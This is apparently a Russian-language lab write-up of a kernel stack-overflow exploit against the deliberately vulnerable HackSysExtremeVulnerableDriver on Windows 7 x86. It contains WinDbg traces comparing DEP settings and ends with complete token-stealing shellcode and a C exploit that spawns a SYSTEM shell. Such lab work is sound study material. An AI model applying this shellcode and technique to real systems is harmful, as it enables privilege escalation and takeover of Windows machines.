---
title: Windows Kernel Exploitation 0x01 | Buffer Overflow [ru]
published: true
tags: [ "kernelexploitation", "windows", "lab" ]
image: assets/previews/7.jpg
layout: page
pagination: 
  enabled: true
---

[Windows Exploitation Resources](https://github.com/FULLSHADE/WindowsExploitationResources)

[Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

[Win Pwn](https://github.com/leesh3288/WinPwn)

[Nixawk awesome windows exploitation](https://github.com/r3p3r/nixawk-awesome-windows-exploitation)

[Windows Exploitation Pathway](https://web.archive.org/web/20200506122824/https://fullpwnops.com/windows-exploitation-pathway.html)

### [](#header-3)Ссылочки

Пара врайтапов на питоне, павершелле и на сях от хашерезады:

[python](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow)

[powershell](https://www.fuzzysecurity.com/tutorials/expDev/14.html)

[c and python](https://jb05s.github.io/HEVD-Driver-Exploitation-Part-2-Stack-Overflow-Presented-in-Python-and-C/)

[врайтап Хашерезады](https://github.com/hasherezade/wke_exercises/blob/master/stackoverflow_expl/main.cpp)

Собственно сорцы самого драйвера:

[HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/643f39023bda9254e5cfd3534f4222c00d89088b)

### [](#header-3)Приступим

* Windows 7 x86 SP1
* Код в конце
* Дебаг
* * bp HEVD!TriggerStackOverflow
* * bp HEVD!TriggerStackOverflow + 8f

### [](#header-3)Выключен DEP + shellcode

`Computer --> Properties --> Advanced --> Performance --> Data Execution Prevention`

Сначала (переписав чужой код и собрав всё нужное вместе) я ошибся и в строке `memcpy(&expl[0x820], &shellcode, 0x4);`

Использовал shellcode вместо shellc_ptr

Разница в том, что shellcode объявлен в секции данных, которая, если я правильно понимаю, будет неисполняемой только в случае включённого DEP'а

shellc_ptr же - это аллоцированная область в куче, в которой мы сами выставляем исполняемый бит и DEP тут ни при чём

Всё сработало, эксплойт прокатил, но ошибку я заметил и решил поэкспериментировать
```js
HEVD!TriggerStackOverflow+0xc8:
a7f616f2 c20800 ret 8
kd> dd /c1 esp L3
    ab679ab4 004040c0
    ab679ab8 0022f680
    ab679abc 00000824
```

Адрес в верхушке стека - место, где в секции даты лежит шеллкод
Посмотрим на права на секции:

```js
kd> !pte 004040c0
                    VA 004040c0
PDE at C0600010            PTE at C0002020
contains 0000000064979867  contains 8000000064853025
pfn 64979     ---DA--UWEV  pfn 64853     ----A--UR-V
```

Адрес очевидно в пространстве даты в процессе
Исполняемого бита E на месте нету (в PTE)

Шагаем дальше и всё исполняется

### [](#header-3)Выключен DEP + shellc_ptr

```js
HEVD!TriggerStackOverflow+0xc8:
a7f616f2 c20800          ret     8
kd> dd /c1 esp L3
    adfefab4  002c0000
    adfefab8  0022f680
    adfefabc  00000824
```

Очевидно, адрес уже из кучи
Бит E стоит

```js
kd> !pte 002c0000
                    VA 002c0000
PDE at C0600008            PTE at C0001600
contains 000000005BCE4867  contains 000000005BCC4867
pfn 5bce4     ---DA--UWEV  pfn 5bcc4     ---DA--UWEV
```

### [](#header-3)Включен DEP + shellcode

```js
kd> dd /c1 esp L3
    abeedab4  004040c0
    abeedab8  0022f680
    abeedabc  00000824
```

Адрес из даты
Бита нету

```js
kd> !pte 004040c0
                    VA 004040c0
PDE at C0600010            PTE at C0002020
contains 0000000051BD3867  contains 8000000051C05025
pfn 51bd3     ---DA--UWEV  pfn 51c05     ----A--UR-V
```

Сидим курим бамбук…
```js
kd> t
    004040c0 60              pushad
kd> t
Access violation - code c0000005 (!!! second chance !!!)
    004040c0 60              pushad
```

### [](#header-3)Включен DEP + shellc_ptr

Куча

```js
HEVD!TriggerStackOverflow+0xc8:
aa35e6f2 c20800          ret     8
kd> dd /c1 esp L3
    ab163ab4  002c0000
    ab163ab8  0022f680
    ab163abc  00000824
```

Исполняемая

```js
kd> !pte 002c0000
                    VA 002c0000
PDE at C0600008            PTE at C0001600
contains 0000000058F7E867  contains 000000005903D867
pfn 58f7e     ---DA--UWEV  pfn 5903d     ---DA--UWEV
```

### [](#header-3)Код

**shellcode.asm**

```nasm
; nasm -f bin shellcode.bin shellcode.asm

[bits 32]

;FS:[0](_KPCR) --> _KPCR+0x120 (PrcbData _KPRCB) --> _KPRCB+0x4 (CurrentThread _KTHREAD) --> _KTHREAD+0x40 (ApcState _KAPC_STATE) --> _KAPC_STATE+0x10 (Process _KPROCESS)
;_EPROCESS.UniqueProcessId 		_EPROCESS+0xb4
;_EPROCESS.ActiveProcessLinks		_EPROCESS+0xb8
;_EPROCESS.Token			_EPROCESS+0xf8

section .text
	WIN7_SP1_SYS_PID		equ 004h	; System PID in Windows 7 SP1 x86
	WIN7_SP1_PID_OFFSET		equ 0B4h	; nt!_EPROCESS.UniqueProcessId
	WIN7_SP1_TOKEN_OFFSET		equ 0F8h	; nt!_EPROCESS.Token
	WIN7_SP1_FLINK_OFFSET		equ 0B8h	; nt!_EPROCESS.ActiveProcessLinks.Flink
	WIN7_SP1_KTHREAD_OFFSET		equ 124h	; nt!_KPCR.PcrbData.CurrentThread
	WIN7_SP1_EPROCESS_OFFSET	equ 050h	; nt!_KTHREAD.ApcStateProcess

global _start

_start:
	pushad
	xor eax, eax						; Set ZERO
	mov eax, [fs:eax + WIN7_SP1_KTHREAD_OFFSET]		; Get nt!_KPCR.PcrbData.CurrentThread
								; _KTHREAD is located at FS:[0x124]
	mov eax, [eax + WIN7_SP1_EPROCESS_OFFSET]		; Get nt!_KTHREAD.ApcState.Process
	mov ecx, eax						; Copy current thread's _EPROCESS structure

	mov edx, WIN7_SP1_SYS_PID				; System PID

	SearchSystemPID:
		mov eax, [eax + WIN7_SP1_FLINK_OFFSET] 		; Get nt!_EPROCESS.ActiveProcessLinks.Flink
		sub eax, WIN7_SP1_FLINK_OFFSET
		cmp [eax + WIN7_SP1_PID_OFFSET], edx		; Compare nt!_EPROCESS.UniqueProcessId with pid in edx
		jne SearchSystemPID

	mov edx, [eax + WIN7_SP1_TOKEN_OFFSET]			; Get System process nt!_EPROCESS.Token
	mov [ecx + WIN7_SP1_TOKEN_OFFSET], edx			; Replace nt!_EPROCESS.Token with System's Token

	popad

	xor eax, eax                                            ; Set NTSTATUS SUCCESS
	pop ebp
	ret 8
```

**exploit.c**

```cpp
#include <Windows.h>
#include <string.h>
#include <stdio.h>

#define IO_CODE 0x222003

const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";

int main() {
	
	printf("[+] Calling CreateFileA() to obtain a handle to driver\n");
    HANDLE hDevice = CreateFileA(kDevName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Error - dailed to get file handle!\n");
        system("pause");
        return -1;
    }
    printf("[+] Successfully obtained a handle to the driver\n");
    
	DWORD bytesRetn;
    char expl[0x824];
	memset(expl, 'A', sizeof(expl));

	char *shellcode = "\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00";

    LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (shellc_ptr)
        memcpy(shellc_ptr, shellcode, 58);
    
    memcpy(&expl[0x820], &shellc_ptr, 0x4);
    //memcpy(&expl[0x820], &shellcode, 0x4);

    //expl[0x820] = ((unsigned char *)(&shellcode))[0];
    //expl[0x821] = ((unsigned char *)(&shellcode))[1];
    //expl[0x822] = ((unsigned char *)(&shellcode))[2];
    //expl[0x823] = ((unsigned char *)(&shellcode))[3];
    
    printf("[+] Starting interaction with the driver\n");
    DeviceIoControl(hDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);
    system("cmd.exe");
	CloseHandle(hDevice);
	
	
    return 0;
}
```
